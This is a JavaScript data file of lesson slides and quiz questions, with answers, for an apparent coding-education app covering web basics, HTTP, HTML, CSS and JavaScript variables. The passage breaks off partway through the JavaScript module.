import { PYTHON_MODULES } from "./python-content";
import { DSA_PART1 } from "./dsa-part1";
import { DSA_PART2 } from "./dsa-part2";

const FULLSTACK_MODULES = [
  {
    id: 1, title: "Foundations", icon: "\u{1F310}", color: "#58CC02", desc: "How the Web Works",
    lessons: [
      {
        title: "Client-Server Model",
        slides: [
          { type: "teach", content: "The web works on a **client-server** model. Your browser (client) sends a **request** to a server, which sends back a **response**.", highlight: "client-server" },
          { type: "teach", content: "Think of it like ordering food: you (client) tell the waiter (HTTP) what you want, and the kitchen (server) prepares and sends it back.", highlight: "HTTP" },
        ],
        questions: [
          { q: "In the client-server model, what is the 'client'?", options: ["The database", "Your web browser", "The API", "The server"], answer: 1 },
          { q: "What protocol does the web use to send requests?", options: ["FTP", "SMTP", "HTTP/HTTPS", "TCP only"], answer: 2 },
          { q: "DNS translates ___ into IP addresses.", options: ["Passwords", "Domain names", "HTML files", "CSS styles"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "A browser visits https://shop.com/products. What is the correct sequence?", code: "1. Browser asks DNS for shop.com's IP\n2. Browser sends GET /products to server\n3. Server processes request\n4. Server sends HTML response\n5. Browser renders the page", options: ["2 → 1 → 3 → 4 → 5", "1 → 2 → 3 → 4 → 5", "3 → 1 → 2 → 5 → 4", "1 → 3 → 2 → 4 → 5"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the client-server interaction:", code: "Client sends a ___BLANK1___ to the server.\nServer processes it and returns a ___BLANK2___.", blanks: [{ id: "BLANK1", options: ["response", "request", "cookie", "stylesheet"], answer: 1 }, { id: "BLANK2", options: ["request", "response", "redirect", "query"], answer: 1 }] },
          { difficulty: "average", q: "If the DNS server is down but you have the IP cached, what happens?", options: ["Nothing works at all", "The site loads normally from cache", "Only images fail to load", "The browser shows a DNS error regardless"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Explain what happens at the network level when you type 'https://api.example.com/users' and press Enter. Include DNS, TCP, TLS, and HTTP steps.", starterCode: "// Describe the full request lifecycle:\n// 1. DNS resolution: ...\n// 2. TCP: ...\n// 3. TLS: ...\n// 4. HTTP: ...", patterns: ["DNS", "TCP", "TLS|SSL|handshake", "HTTP|GET"], sampleAnswer: "// 1. DNS resolution: Browser checks cache, then asks DNS server to resolve api.example.com to an IP address\n// 2. TCP: Browser opens a TCP connection via 3-way handshake (SYN, SYN-ACK, ACK) to port 443\n// 3. TLS: Client and server perform TLS handshake to establish encrypted connection\n// 4. HTTP: Browser sends GET /users request with headers; server responds with status code and JSON body" },
          { difficulty: "advanced", type: "order", q: "Arrange the full lifecycle of an HTTPS request in correct order:", lines: ["DNS resolves domain to IP address", "TCP 3-way handshake (SYN, SYN-ACK, ACK)", "TLS handshake establishes encrypted tunnel", "HTTP GET request sent through encrypted connection", "Server processes request and sends response", "Browser parses and renders the response"], correctOrder: [0, 1, 2, 3, 4, 5] },
          { difficulty: "advanced", q: "A CDN returns a cached response for static assets. Which trade-off is most critical?", options: ["Speed vs. code readability", "Freshness vs. latency (stale cache vs. fast delivery)", "Security vs. accessibility", "Bandwidth vs. CPU usage"], answer: 1 },
        ]
      },
      {
        title: "HTTP Methods & Status Codes",
        slides: [
          { type: "teach", content: "HTTP has **methods** that tell the server what action to take: **GET** (read), **POST** (create), **PUT** (update), **DELETE** (remove).", highlight: "methods" },
          { type: "teach", content: "Servers reply with **status codes**: **200** = OK, **404** = Not Found, **500** = Server Error. Think of them as the server's mood ring!", highlight: "status codes" },
        ],
        questions: [
          { q: "Which HTTP method is used to CREATE new data?", options: ["GET", "POST", "DELETE", "PATCH"], answer: 1 },
          { q: "What does a 404 status code mean?", options: ["Server error", "Success", "Not found", "Unauthorized"], answer: 2 },
          { q: "Which method retrieves data WITHOUT modifying it?", options: ["POST", "PUT", "DELETE", "GET"], answer: 3 },
          // Average
          { difficulty: "average", type: "output", q: "A user submits a form to create an account. The server saves it successfully. What status code and method were used?", code: "fetch('/api/users', {\n  method: '???',\n  body: JSON.stringify({ name: 'Alice' })\n});\n// Server responds with status: ???", options: ["GET, 200", "POST, 201", "PUT, 200", "POST, 200"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the RESTful API calls:", code: "// Read all users\nfetch('/api/users', { method: '___BLANK1___' })\n\n// Delete user 5\nfetch('/api/users/5', { method: '___BLANK2___' })", blanks: [{ id: "BLANK1", options: ["POST", "GET", "PUT", "PATCH"], answer: 1 }, { id: "BLANK2", options: ["GET", "POST", "DELETE", "REMOVE"], answer: 2 }] },
          { difficulty: "average", q: "You receive a 301 status code. What should your client do?", options: ["Retry the same request", "Follow the redirect to the new URL", "Show an error to the user", "Resend with different credentials"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What is wrong with this API design and what status code should the error return?", code: "// Client sends:\nPATCH /api/users/99\n{ \"email\": \"not-an-email\" }\n\n// User 99 exists but email is invalid\n// Server should respond with: ???", options: ["404 Not Found", "400 Bad Request", "500 Internal Server Error", "200 OK with error in body"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Design a RESTful API for a blog. Define endpoints for: listing posts, getting one post, creating a post, updating a post, and deleting a post. Include HTTP methods and expected status codes.", starterCode: "// Blog API Design:\n// List posts:   \n// Get one post: \n// Create post:  \n// Update post:  \n// Delete post:  ", patterns: ["GET.*posts", "POST.*posts", "PUT|PATCH.*posts", "DELETE.*posts", "200|201|204"], sampleAnswer: "// Blog API Design:\n// List posts:   GET    /api/posts        → 200 (array of posts)\n// Get one post: GET    /api/posts/:id    → 200 (single post) or 404\n// Create post:  POST   /api/posts        → 201 (created post)\n// Update post:  PATCH  /api/posts/:id    → 200 (updated post) or 404\n// Delete post:  DELETE /api/posts/:id    → 204 (no content) or 404" },
          { difficulty: "advanced", q: "When should you use PUT vs. PATCH?", options: ["PUT for create, PATCH for delete", "PUT replaces the entire resource, PATCH updates partial fields", "They are interchangeable", "PATCH is only for file uploads"], answer: 1 },
        ]
      },
      {
        title: "Dev Environment Setup",
        slides: [
          { type: "teach", content: "Every developer needs their toolkit: a **code editor** (VS Code), **Node.js** (JavaScript runtime), **Git** (version control), and **browser DevTools**.", highlight: "code editor" },
          { type: "teach", content: "The **terminal** is your command center. It may look intimidating, but it's just a text-based way to talk to your computer. You'll use it daily!", highlight: "terminal" },
        ],
        questions: [
          { q: "Which tool is the most popular code editor for web dev?", options: ["Notepad", "VS Code", "Microsoft Word", "Sublime only"], answer: 1 },
          { q: "Node.js allows you to run JavaScript ___.", options: ["Only in browsers", "On servers/outside browsers", "Only on mobile", "In Excel"], answer: 1 },
          { q: "What does Git help you manage?", options: ["Databases", "Design files", "Code versions/history", "Server hardware"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "What does this terminal command sequence do?", code: "mkdir my-project\ncd my-project\nnpm init -y\nnpm install express", options: ["Deletes a project and its dependencies", "Creates a folder, initializes a Node project, and installs Express", "Starts a web server on port 3000", "Clones a repository from GitHub"], answer: 1 },
          { difficulty: "average", type: "order", q: "Arrange the steps to set up a new web development project:", lines: ["Install Node.js and VS Code", "Open terminal and create project folder", "Run npm init to create package.json", "Install dependencies with npm install"], correctOrder: [0, 1, 2, 3] },
          { difficulty: "average", type: "fill", q: "Complete the terminal commands:", code: "# Check Node.js version\n___BLANK1___ --version\n\n# Initialize a new project\nnpm ___BLANK2___", blanks: [{ id: "BLANK1", options: ["npm", "node", "git", "code"], answer: 1 }, { id: "BLANK2", options: ["start", "install", "init", "run"], answer: 2 }] },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a package.json scripts section that includes: a dev server with nodemon, a production start, a test command, and a lint command.", starterCode: "\"scripts\": {\n  \n}", patterns: ["dev.*nodemon|nodemon.*dev", "start.*node|node.*start", "test", "lint.*eslint|eslint.*lint"], sampleAnswer: "\"scripts\": {\n  \"dev\": \"nodemon src/index.js\",\n  \"start\": \"node src/index.js\",\n  \"test\": \"vitest run\",\n  \"lint\": \"eslint src/\"\n}" },
          { difficulty: "advanced", type: "output", q: "What does this .gitignore file prevent from being committed?", code: "node_modules/\n.env\ndist/\n*.log\n.DS_Store", options: ["Only JavaScript files", "Dependencies, secrets, build output, logs, and OS files", "All files in the project", "Only the .env file"], answer: 1 },
          { difficulty: "advanced", q: "Why should node_modules NOT be committed to Git?", options: ["It makes the code run slower", "It's regenerated from package.json via npm install, and it's massive", "Git cannot track binary files", "Node.js requires a fresh install every time"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 2, title: "HTML", icon: "\u{1F4C4}", color: "#E34F26", desc: "Semantic Markup",
    lessons: [
      {
        title: "Document Structure",
        slides: [
          { type: "teach", content: "Every HTML page starts with **<!DOCTYPE html>** and has two main sections: **<head>** (metadata, title, links) and **<body>** (visible content).", highlight: "head and body" },
          { type: "teach", content: "HTML uses **tags** wrapped in angle brackets: `<p>Hello</p>`. Most tags have an opening and closing tag. They create the **skeleton** of your page.", highlight: "tags" },
        ],
        questions: [
          { q: "What goes inside the <head> tag?", options: ["Visible text", "Images", "Metadata and title", "Buttons"], answer: 2 },
          { q: "Which is the correct HTML boilerplate start?", options: ["<html>", "<!DOCTYPE html>", "<start>", "<page>"], answer: 1 },
          { q: "The <body> tag contains:", options: ["CSS styles only", "Visible page content", "Server config", "Database queries"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What will the browser tab display for this page?", code: "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>My Portfolio</title>\n</head>\n<body>\n  <h1>Welcome</h1>\n</body>\n</html>", options: ["Welcome", "My Portfolio", "UTF-8", "en"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the HTML boilerplate:", code: "<!DOCTYPE ___BLANK1___>\n<html lang=\"en\">\n<___BLANK2___>\n  <meta charset=\"UTF-8\">\n  <title>My App</title>\n</head>\n<body>\n</body>\n</html>", blanks: [{ id: "BLANK1", options: ["page", "html", "document", "web"], answer: 1 }, { id: "BLANK2", options: ["header", "head", "meta", "top"], answer: 1 }] },
          { difficulty: "average", q: "What happens if you omit <!DOCTYPE html>?", options: ["The page won't load at all", "The browser enters 'quirks mode' and may render inconsistently", "Only images break", "The CSS won't load"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "order", q: "Arrange these <head> elements in the recommended order for performance:", lines: ["<meta charset=\"UTF-8\">", "<meta name=\"viewport\" content=\"width=device-width\">", "<title>My App</title>", "<link rel=\"stylesheet\" href=\"styles.css\">", "<script src=\"app.js\" defer></script>"], correctOrder: [0, 1, 2, 3, 4] },
          { difficulty: "advanced", type: "freeform", q: "Write a complete HTML document with proper head metadata (charset, viewport, title, description meta tag) and a body with a heading and paragraph.", starterCode: "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  \n</head>\n<body>\n  \n</body>\n</html>", patterns: ["meta.*charset", "meta.*viewport", "<title>", "meta.*description", "<h[1-6]>", "<p>"], sampleAnswer: "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>My Website</title>\n  <meta name=\"description\" content=\"A personal website showcasing my projects\">\n</head>\n<body>\n  <h1>Hello World</h1>\n  <p>Welcome to my website.</p>\n</body>\n</html>" },
          { difficulty: "advanced", type: "output", q: "Which meta tag is MOST critical for mobile responsiveness?", code: "<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<meta name=\"description\" content=\"My site\">\n<meta name=\"author\" content=\"Alice\">", options: ["charset", "viewport", "description", "author"], answer: 1 },
        ]
      },
      {
        title: "Semantic Elements",
        slides: [
          { type: "teach", content: "**Semantic HTML** uses meaningful tags like **<header>**, **<nav>**, **<main>**, **<article>**, and **<footer>** instead of generic `<div>` everywhere.", highlight: "Semantic" },
          { type: "teach", content: "Why care? Screen readers use semantic tags for accessibility, search engines use them for SEO, and your code becomes **self-documenting**.", highlight: "accessibility" },
        ],
        questions: [
          { q: "Which is a semantic HTML element?", options: ["<div>", "<span>", "<article>", "<box>"], answer: 2 },
          { q: "Semantic HTML helps with:", options: ["Making pages load faster", "Accessibility and SEO", "Adding animations", "Database queries"], answer: 1 },
          { q: "For page navigation links, use:", options: ["<div>", "<nav>", "<link>", "<menu>"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "Which version is semantically correct?", code: "// Version A:\n<div class=\"header\">\n  <div class=\"nav\">Links</div>\n</div>\n<div class=\"content\">Article</div>\n\n// Version B:\n<header>\n  <nav>Links</nav>\n</header>\n<main>\n  <article>Article</article>\n</main>", options: ["Version A - divs are more compatible", "Version B - uses meaningful semantic tags", "Both are equally correct", "Neither - you need both approaches"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Replace the generic divs with semantic elements:", code: "<___BLANK1___>\n  <h1>My Blog</h1>\n  <___BLANK2___>Home | About | Contact</nav>\n</header>", blanks: [{ id: "BLANK1", options: ["div", "header", "section", "head"], answer: 1 }, { id: "BLANK2", options: ["div", "menu", "nav", "ul"], answer: 2 }] },
          { difficulty: "average", q: "What is the difference between <section> and <article>?", options: ["They are identical", "<article> is self-contained content; <section> groups related content", "<section> is for text; <article> is for images", "<article> is deprecated"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Convert this non-semantic HTML to fully semantic HTML. The page has a site header with nav, a main blog post, a sidebar, and a footer.", starterCode: "<div class=\"header\">\n  <div class=\"nav\">...</div>\n</div>\n<div class=\"main\">\n  <div class=\"post\">...</div>\n  <div class=\"sidebar\">...</div>\n</div>\n<div class=\"footer\">...</div>", patterns: ["<header", "<nav", "<main", "<article|<section", "<aside", "<footer"], sampleAnswer: "<header>\n  <nav>...</nav>\n</header>\n<main>\n  <article>...</article>\n  <aside>...</aside>\n</main>\n<footer>...</footer>" },
          { difficulty: "advanced", type: "order", q: "Arrange the semantic page structure in correct order:", lines: ["<header> with <nav>", "<main>", "<article> inside main", "<aside> sidebar", "<footer>"], correctOrder: [0, 1, 2, 3, 4] },
          { difficulty: "advanced", q: "A screen reader user navigates by landmarks. Which semantic structure gives the BEST experience?", options: ["Using only <div> and <span> with ARIA roles", "Using semantic tags (<header>, <nav>, <main>, <footer>) which provide implicit ARIA landmarks", "Using <p> tags for everything with class names", "Screen readers cannot detect page structure"], answer: 1 },
        ]
      },
      {
        title: "Forms & Inputs",
        slides: [
          { type: "teach", content: "Forms collect user data with **<form>**, **<input>**, **<select>**, and **<textarea>**. Always pair inputs with **<label>** for accessibility!", highlight: "label" },
          { type: "teach", content: "Input types like **email**, **password**, **number**, and **date** give you free browser validation. The `required` attribute prevents empty submissions.", highlight: "validation" },
        ],
        questions: [
          { q: "Which attribute makes a form field mandatory?", options: ["important", "required", "mandatory", "needed"], answer: 1 },
          { q: "What input type gives a date picker?", options: ["text", "calendar", "date", "time"], answer: 2 },
          { q: "Labels improve:", options: ["Page speed", "Accessibility", "Server performance", "CSS styling"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What happens when this form is submitted with an empty email field?", code: "<form action=\"/submit\" method=\"POST\">\n  <label for=\"email\">Email:</label>\n  <input type=\"email\" id=\"email\" required>\n  <button type=\"submit\">Send</button>\n</form>", options: ["It submits with an empty value", "The browser blocks submission and shows a validation error", "It sends a GET request instead", "The page refreshes silently"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the accessible form:", code: "<form>\n  <___BLANK1___ for=\"username\">Name:</label>\n  <input type=\"text\" ___BLANK2___=\"username\" required>\n  <button type=\"submit\">Register</button>\n</form>", blanks: [{ id: "BLANK1", options: ["span", "label", "div", "p"], answer: 1 }, { id: "BLANK2", options: ["name", "class", "id", "for"], answer: 2 }] },
          { difficulty: "average", q: "Why should the 'for' attribute on <label> match the 'id' on <input>?", options: ["It makes the CSS work", "Clicking the label focuses/activates the input (accessibility)", "It's required for form submission", "It prevents XSS attacks"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Build a registration form with: name (text, required), email (email, required), password (password, min 8 chars), age (number, min 18), and a submit button. Use proper labels and validation attributes.", starterCode: "<form>\n  \n</form>", patterns: ["type=\"text\".*required|required.*type=\"text\"", "type=\"email\"", "type=\"password\"", "minlength=\"8\"|minLength=\"8\"", "type=\"number\"", "min=\"18\"", "<label", "type=\"submit\""], sampleAnswer: "<form>\n  <label for=\"name\">Name:</label>\n  <input type=\"text\" id=\"name\" required>\n\n  <label for=\"email\">Email:</label>\n  <input type=\"email\" id=\"email\" required>\n\n  <label for=\"password\">Password:</label>\n  <input type=\"password\" id=\"password\" minlength=\"8\" required>\n\n  <label for=\"age\">Age:</label>\n  <input type=\"number\" id=\"age\" min=\"18\" required>\n\n  <button type=\"submit\">Register</button>\n</form>" },
          { difficulty: "advanced", type: "output", q: "What is the security issue with this form?", code: "<form action=\"/login\" method=\"GET\">\n  <input type=\"text\" name=\"user\">\n  <input type=\"password\" name=\"pass\">\n  <button type=\"submit\">Login</button>\n</form>", options: ["The form has no labels", "GET exposes credentials in the URL — should use POST", "The action URL is wrong", "There is no security issue"], answer: 1 },
          { difficulty: "advanced", q: "Which combination of attributes provides the BEST client-side validation for a phone number field?", options: ["type=\"text\" with no validation", "type=\"tel\" with pattern=\"[0-9]{3}-[0-9]{3}-[0-9]{4}\" and title attribute for guidance", "type=\"number\" with maxlength", "type=\"phone\" with required"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 3, title: "CSS", icon: "\u{1F3A8}", color: "#264DE4", desc: "Styling & Layout",
    lessons: [
      {
        title: "Box Model & Selectors",
        slides: [
          { type: "teach", content: "Every element is a **box** with 4 layers: **content \u2192 padding \u2192 border \u2192 margin**. Use `box-sizing: border-box` so widths include padding and border.", highlight: "box" },
          { type: "teach", content: "**Selectors** target elements: `.class`, `#id`, `element`. Specificity determines which rule wins: IDs (1-0-0) > Classes (0-1-0) > Elements (0-0-1).", highlight: "Specificity" },
        ],
        questions: [
          { q: "The CSS box model layers (inside to out) are:", options: ["margin, border, padding, content", "content, padding, border, margin", "content, margin, padding, border", "border, content, padding, margin"], answer: 1 },
          { q: "Which selector has the HIGHEST specificity?", options: [".card", "#header", "div", "p.active"], answer: 1 },
          { q: "box-sizing: border-box makes width include:", options: ["Only content", "Content + padding + border", "Content + margin", "Everything"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What is the total width this element occupies on screen?", code: ".box {\n  width: 200px;\n  padding: 20px;\n  border: 5px solid black;\n  margin: 10px;\n  box-sizing: content-box;\n}", options: ["200px", "250px", "270px", "250px content area, 270px total space"], answer: 2 },
          { difficulty: "average", type: "output", q: "Which element gets the red background?", code: "<div id=\"main\" class=\"container\">\n  <p class=\"text\">Hello</p>\n</div>\n\nCSS:\n#main .text { background: red; }\n.container p { background: blue; }\np.text { background: green; }", options: ["Blue — .container p is last", "Green — p.text is most specific", "Red — #main .text has highest specificity (1-1-0)", "All three apply equally"], answer: 2 },
          { difficulty: "average", type: "fill", q: "Complete the CSS to make an element 300px wide INCLUDING padding and border:", code: ".card {\n  ___BLANK1___: border-box;\n  width: 300px;\n  padding: 20px;\n  ___BLANK2___: 2px solid #ccc;\n}", blanks: [{ id: "BLANK1", options: ["display", "box-sizing", "position", "overflow"], answer: 1 }, { id: "BLANK2", options: ["outline", "border", "margin", "box-shadow"], answer: 1 }] },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write CSS that demonstrates understanding of specificity. Create 3 rules targeting the same paragraph: one with element selector, one with class, one with ID. Add a comment explaining which wins and why.", starterCode: "/* HTML: <p id=\"intro\" class=\"highlight\">Text</p> */\n\n", patterns: ["p\\s*\\{", "\\.highlight\\s*\\{", "#intro\\s*\\{", "specificity|wins|overrides|priority"], sampleAnswer: "/* HTML: <p id=\"intro\" class=\"highlight\">Text</p> */\n\np { color: blue; }           /* specificity: 0-0-1 */\n.highlight { color: green; }  /* specificity: 0-1-0 */\n#intro { color: red; }        /* specificity: 1-0-0 — wins because ID has highest specificity */" },
          { difficulty: "advanced", type: "output", q: "Two developers disagree. Dev A uses box-sizing: border-box globally. Dev B uses content-box (default). With width: 100% and padding: 20px on a child element inside a 400px parent, what happens?", code: "/* Dev A */\n* { box-sizing: border-box; }\n.child { width: 100%; padding: 20px; }\n\n/* Dev B (default content-box) */\n.child { width: 100%; padding: 20px; }", options: ["Both render identically", "Dev A: child fits inside parent. Dev B: child overflows by 40px", "Dev A: child is 360px content. Dev B: child is 400px content", "Dev B is correct; border-box causes layout issues"], answer: 1 },
          { difficulty: "advanced", q: "When should you use !important in production CSS?", options: ["Always, to ensure styles apply", "Never — it's always bad practice", "Rarely — only to override third-party/inline styles you cannot modify", "Only in media queries"], answer: 2 },
        ]
      },
      {
        title: "Flexbox & Grid",
        slides: [
          { type: "teach", content: "**Flexbox** is for **1D layouts** (row OR column). Set `display: flex` on a container, then use `justify-content` (main axis) and `align-items` (cross axis).", highlight: "Flexbox" },
          { type: "teach", content: "**CSS Grid** is for **2D layouts** (rows AND columns). Use `grid-template-columns` and `grid-template-rows` to define your layout structure.", highlight: "Grid" },
        ],
        questions: [
          { q: "Flexbox is best for ___ dimensional layouts.", options: ["Zero", "One", "Two", "Three"], answer: 1 },
          { q: "Which property aligns flex items on the main axis?", options: ["align-items", "justify-content", "flex-wrap", "align-self"], answer: 1 },
          { q: "CSS Grid excels at ___ layouts.", options: ["One-dimensional", "Two-dimensional", "Print", "Email"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "How will the three child elements be laid out?", code: ".container {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n/* Container is 600px wide */\n/* Three children each 100px wide */", options: ["All stacked vertically", "Left-aligned with no spacing", "Evenly spread: one left, one center, one right, vertically centered", "Wrapped to two rows"], answer: 2 },
          { difficulty: "average", type: "fill", q: "Create a 3-column grid layout:", code: ".grid {\n  display: ___BLANK1___;\n  ___BLANK2___: repeat(3, 1fr);\n  gap: 16px;\n}", blanks: [{ id: "BLANK1", options: ["flex", "grid", "block", "inline"], answer: 1 }, { id: "BLANK2", options: ["grid-template-rows", "grid-template-columns", "grid-auto-flow", "grid-gap"], answer: 1 }] },
          { difficulty: "average", type: "output", q: "What does 'fr' unit mean in this Grid declaration?", code: ".layout {\n  display: grid;\n  grid-template-columns: 1fr 2fr 1fr;\n}", options: ["Fixed pixels: 1px, 2px, 1px", "Fractions of available space: 25%, 50%, 25%", "Font-relative sizes", "Frame rates for animation"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Create a holy grail layout using CSS Grid: header (full width), left sidebar (200px), main content (flexible), right sidebar (200px), footer (full width). Name the grid areas.", starterCode: ".layout {\n  display: grid;\n  \n}", patterns: ["grid-template-areas", "header", "sidebar|aside", "main|content", "footer", "grid-template-columns"], sampleAnswer: ".layout {\n  display: grid;\n  grid-template-areas:\n    \"header  header  header\"\n    \"left    main    right\"\n    \"footer  footer  footer\";\n  grid-template-columns: 200px 1fr 200px;\n  grid-template-rows: auto 1fr auto;\n  min-height: 100vh;\n}" },
          { difficulty: "advanced", type: "output", q: "When should you choose Flexbox over Grid?", code: "/* Scenario A: Navigation bar with logo left, links right */\n/* Scenario B: Photo gallery with 4 equal columns and rows */\n/* Scenario C: Centering a single element */\n/* Scenario D: Full page layout with header/sidebar/content/footer */", options: ["Grid for all scenarios", "Flexbox: A, C. Grid: B, D", "Flexbox for all scenarios", "Flexbox: B, D. Grid: A, C"], answer: 1 },
          { difficulty: "advanced", type: "order", q: "Arrange CSS properties to create a responsive card grid that wraps:", lines: ["display: grid;", "grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));", "gap: 24px;", "padding: 24px;"], correctOrder: [0, 1, 2, 3] },
        ]
      },
      {
        title: "Responsive Design",
        slides: [
          { type: "teach", content: "**Mobile-first** design: write base CSS for small screens, then use **@media (min-width)** queries to add styles for larger screens.", highlight: "Mobile-first" },
          { type: "teach", content: "Use **relative units** (rem, %, vw, vh) instead of pixels. `1rem = 16px` by default. This makes your layouts fluid and accessible.", highlight: "relative units" },
        ],
        questions: [
          { q: "Mobile-first means base styles are for:", options: ["Desktop", "Tablet", "Mobile", "Print"], answer: 2 },
          { q: "Which media query targets screens 768px and wider?", options: ["@media (max-width: 768px)", "@media (min-width: 768px)", "@media (width: 768px)", "@media (screen: 768px)"], answer: 1 },
          { q: "1rem equals ___ by default.", options: ["10px", "12px", "16px", "20px"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "On a 1024px wide screen, what color is the background?", code: "body { background: red; }          /* base */\n\n@media (min-width: 768px) {\n  body { background: blue; }\n}\n\n@media (min-width: 1200px) {\n  body { background: green; }\n}", options: ["Red — base styles always win", "Blue — 1024px matches min-width: 768px but not 1200px", "Green — largest query wins", "Purple — colors mix together"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the mobile-first responsive layout:", code: ".container {\n  width: 100%;         /* mobile: full width */\n  padding: 1___BLANK1___;\n}\n\n@media (___BLANK2___: 768px) {\n  .container {\n    width: 750px;\n    margin: 0 auto;\n  }\n}", blanks: [{ id: "BLANK1", options: ["px", "rem", "vw", "em"], answer: 1 }, { id: "BLANK2", options: ["max-width", "min-width", "width", "screen"], answer: 1 }] },
          { difficulty: "average", q: "Why use rem instead of px for font sizes?", options: ["rem is faster to render", "rem respects user's browser font-size settings (accessibility)", "rem is the only unit browsers support", "px is deprecated"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a mobile-first responsive CSS system with 3 breakpoints (tablet: 768px, desktop: 1024px, wide: 1440px) that changes a grid from 1 column to 2, 3, and 4 columns respectively.", starterCode: ".grid {\n  display: grid;\n  gap: 16px;\n  /* mobile: 1 column */\n}\n\n/* Add breakpoints below */", patterns: ["grid-template-columns", "min-width:\\s*768", "min-width:\\s*1024", "min-width:\\s*1440", "repeat|1fr"], sampleAnswer: ".grid {\n  display: grid;\n  gap: 16px;\n  grid-template-columns: 1fr;\n}\n\n@media (min-width: 768px) {\n  .grid { grid-template-columns: repeat(2, 1fr); }\n}\n\n@media (min-width: 1024px) {\n  .grid { grid-template-columns: repeat(3, 1fr); }\n}\n\n@media (min-width: 1440px) {\n  .grid { grid-template-columns: repeat(4, 1fr); }\n}" },
          { difficulty: "advanced", type: "output", q: "What is the problem with this approach?", code: "/* Desktop-first approach: */\n.sidebar {\n  width: 300px;\n  float: left;\n}\n.content {\n  margin-left: 320px;\n}\n\n@media (max-width: 768px) {\n  .sidebar { display: none; }\n  .content { margin-left: 0; }\n}", options: ["Nothing wrong — desktop-first is valid", "Desktop-first loads unnecessary styles on mobile, increasing payload for the most constrained devices", "The sidebar should use flexbox instead", "max-width queries don't work in browsers"], answer: 1 },
          { difficulty: "advanced", q: "Which modern CSS feature can replace many media queries for responsive layouts?", options: ["CSS Variables (custom properties)", "Container queries — style based on parent size, not viewport size", "CSS animations", "CSS counters"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 4, title: "JavaScript", icon: "\u26A1", color: "#F7DF1E", desc: "Fundamentals",
    lessons: [
      {
        title: "Variables & Types",
        slides: [
          { type: "teach", content: "Use **const** for values that don't change and **let** for values that do. Avoid `var` \u2014 it's legacy and has scoping issues.", highlight: "const and let" },
          { type: "teach", content: "JavaScript has 7 primitive types: **string**, **number**, **boolean**, **null**, **undefined**, **symbol**, **bigint**. Plus **object** for complex data.", highlight: "primitive" },
        ],
        questions: [
          { q: "Which keyword should you DEFAULT to for variables?", options: ["var", "let", "const", "define"], answer: 2 },
          { q: "What type is the value `true`?", options: ["String", "Number", "Boolean", "Object"], answer: 2 },
          { q: "null represents:", options: ["Zero", "Empty string", "Intentional absence of value", "An error"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "What does this code output?", code: "let x = 5;\nconst y = \"5\";\nconsole.log(x == y);\nconsole.log(x === y);", options: ["true, true", "false, false", "true, false", "false, true"], answer: 2 },
          { difficulty: "average", type: "output", q: "What does this code log?", code: "console.log(typeof null);\nconsole.log(typeof undefined);\nconsole.log(typeof NaN);", options: ["\"null\", \"undefined\", \"NaN\"", "\"object\", \"undefined\", \"number\"", "\"null\", \"null\", \"number\"", "Error on first line"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the code using correct variable declarations:", code: "___BLANK1___ PI = 3.14159;  // never changes\n___BLANK2___ count = 0;     // will be reassigned\ncount = count + 1;", blanks: [{ id: "BLANK1", options: ["var", "let", "const", "define"], answer: 2 }, { id: "BLANK2", options: ["var", "let", "const", "int"], answer: 1 }] },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What does this code output and why?", code: "console.log(a);\nvar a = 10;\n\nconsole.log(b);\nlet b = 20;", options: ["undefined, undefined", "10, 20", "undefined, then ReferenceError (let is not hoisted to accessible state)", "ReferenceError on both lines"], answer: 2 },
          { difficulty: "advanced", type: "freeform", q: "Explain the difference between var, let, and const with code examples. Show scoping behavior, hoisting, and reassignment rules.", starterCode: "// var example:\n\n// let example:\n\n// const example:\n", patterns: ["var\\s+\\w+", "let\\s+\\w+", "const\\s+\\w+", "scope|block|function|hoist"], sampleAnswer: "// var example: function-scoped, hoisted as undefined\nif (true) { var x = 1; }\nconsole.log(x); // 1 — var leaks out of blocks\n\n// let example: block-scoped, not accessible before declaration\nif (true) { let y = 2; }\n// console.log(y); // ReferenceError — block scope\n\n// const example: block-scoped, cannot be reassigned\nconst z = 3;\n// z = 4; // TypeError: Assignment to constant\n// But objects/arrays can be mutated:\nconst arr = [1]; arr.push(2); // OK" },
